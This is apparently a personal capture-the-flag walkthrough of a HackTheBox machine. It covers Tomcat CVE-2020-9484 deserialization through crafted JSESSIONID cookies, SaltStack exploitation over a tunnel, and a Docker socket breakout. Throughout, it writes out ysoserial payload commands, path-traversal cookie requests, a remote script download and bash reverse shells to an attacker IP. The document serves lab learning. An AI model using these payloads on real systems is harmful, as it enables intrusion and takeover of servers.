HackTheBox
# Scan
![](https://github.com/flucasd7/Ethical-Hacking/blob/main/Pasted%20image%2020240401181810.png)

# Uploading files
When trying to upload a file, it accepts all extension, even whithout any, however when there is no filename, there is an error.

![[Pasted image 20240402175526.png]]

Testing email: *test@tes    t.com* We have an error as well:
![[Pasted image 20240402175654.png]]
It seems that the upload folder is */opt/samples/uploads* but we don't have access to this

Considering the errors and nmap scan result, this service uses **Apache 9.0.27** which is vulnerable

https://github.com/PenTestical/CVE-2020-9484

Explanation of CVE-2020-9484
https://www.prismosystems.com/blog/cve-2020-9484#:~:text=Exploitation%20Details%20of%20CVE%2D2020%2D9484&text=The%20vulnerability%20resides%20in%20Persistent,of%20the%20attacker%2Dcontrolled%20object.

If *JSSESIONID=../../../../../tmp/test* , at first the manager will verify if this is in memory, is not Persistance Manager (if configured) check if this is stored in disk in the path as *"sessionid".session*

It will look in that path as test.session, as we know that probably .session file will be stored in */opt/samples/uploads* so we can create the payload:

*JSESSIONID=../../../../opt/samples/uploads/file*

Using a *filename=file.session*, in this maner as JSESSIONID doesn't exist in memory, Pesistance Manager wil look for add the extension .session to file, we wiil look for *file.session* in upload *file* and as there is a coincidence, it will execute *file.session*

Using Vulnerable Serialization
#VulnerableSerialization
![[Ysoserial]]

Tyring a ping test, we craft a payload loading a file *ping.session*

`java --add-opens java.base/sun.reflect.annotation=ALL-UNNAMED -jar ysoserial-all.jar CommonsCollections1 'ping -c 1 10.10.14.70' > ping.session`

We can now upload *pin.session* to the vulnerable web server.

### Execution of the payload
We can call this file directly by using *curl* and to get the pin response, we wait for a response by using *tcpdump* tool, the vulnerable JSESSIONID receives the storage path of the application and Persistant manager adds '.session' at the end
````
curl -s -X GET "http://10.10.10.205:8080/" -H "Cookie: JSESSIONID=../../../../../../../opt/samples/uploads/ping"
````

However, we don't receive anything

![[Pasted image 20240403082426.png]]
### Using CommonsCollections2
````
java -jar ysoserial-all.jar CommonsCollections2 'ping -c 1 10.10.14.70' > ping2.session
````
![[Pasted image 20240403155457.png]]
After loaded, we lunch the curl:
`curl -s -X GET "http://10.10.10.205:8080/" -H "Cookie: JSESSIONID=../../../../../../../opt/samples/uploads/ping2"`

Now we receive the ICMP

**Note:** It's necessary to have a JSESSION ID to load the file so at first we must try with different payloads or load many time until get one, if not it won't work.

## Remote Code execution

We can send a reverse shell in three steps:
### 1. Generating the reverse shell
By leveraging curl, we can upload by a web server in our side by crafting an *index.html* file with a reverse shell:

`#!/bin/bash`
`bash -i >& /dev/tcp/10.10.14.70/4443 0>&1`

Creating the file, after uploaded to the file
 java -jar ysoserial-all.jar CommonsCollections2 'curl 10.10.14.70 -o /dev/shm/reverse.sh' > pwned.session

````
curl -s -X GET "http://10.10.10.205:8080/" -H "Cookie: JSESSIONID=../../../../../../../opt/samples/uploads/pwned"
````

We get a GET request so we can infer it was executed and 
![[Pasted image 20240403160836.png]]
### 2. Giving execution permission
````
 java -jar ysoserial-all.jar CommonsCollections2 'chmod +x /dev/shm/reverse.sh' > pwned2.session
````

Load the file and then
````
curl -s -X GET "http://10.10.10.205:8080/" -H "Cookie: JSESSIONID=../../../../../../../opt/samples/uploads/pwned2"
````
### 3. Generating the shell
````
 java -jar ysoserial-all.jar CommonsCollections2 '/dev/shm/reverse.sh' > pwned3.session
````

Load the file and then
````
curl -s -X GET "http://10.10.10.205:8080/" -H "Cookie: JSESSIONID=../../../../../../../opt/samples/uploads/pwned3"
````

curl must be executing with the port 4443 already listening

![[Pasted image 20240403163214.png]]

## Privilege Escalation
We can exploit pkexec but it's not the purpose of this machine 
`find \-perm -4000 2>/dev/null`
![[Pasted image 20240403163952.png]]

Reviewing internal ports
`netstat -nat`

![[Pasted image 20240403164128.png]]

## SaltStak exploitation
Ports 4505 and 4506 were not found in nmap scam

https://www.exploit-db.com/exploits/48421

![[Pasted image 20240403171344.png]]

For this exploit we need to have installed module *salt*

As ports 4505 and 4506 are open internally, we can have access to them by chisel 
Uloading chisel:
![[Pasted image 20240403172222.png]]

Creating the tunnel:
![[Pasted image 20240403172333.png]]

Adding to /etc/proxychains.conf

![[Pasted image 20240403172430.png]]

### Using the exploit with proxychains

`proxychains python3 ssaltstack_exploit.py`

Testing command execution with the exploit:
`proxychains python3 ssaltstack_exploit.py --exec "ping 10.10.14.70"`
![[Pasted image 20240403172910.png]]

### Creating a shell to the container
We test as first `"bash -c 'bash -i >& /dev/tcp/10.10.14.70/4443 0>&1'"` but it doesn't work, considering using *'* at the beginning and *"* in the inner bash.

`proxychains python3 saltstack_exploit.py --exec 'bash -c "bash -i >& /dev/tcp/10.10.14.70/4443 0>&1"'`

![[Pasted image 20240403173313.png]]

## Docker Container breakout
[[Docker Breakout]]

Checking files and *history* of the machine  
- The `history` command in Linux is a powerful feature used primarily in command-line interfaces (CLI) to display a list of commands that have been previously entered by the user in the current session or saved in a user's history file
We found a curl to *docker.sock* to list images

![[Pasted image 20240403175021.png]]
we only have access to this with *--unix-sockets*

We can see the same information prettier by sending to the attacker machine

![[Pasted image 20240403180537.png]]
![[Pasted image 20240403180522.png]]

We can try as well:
`curl -s --unix-socket /var/run/docker.sock http://localhost/containers/json`

To get access to dockers from the main machine, we don't have permissions but we can confirm that the path is /file/run/docker that is found in the container
![[Pasted image 20240403180841.png]]

## Writable Docker Socket
We already found an image called *sandbox:latest* 

![[Writable Docker Socket (docker.sock)]]
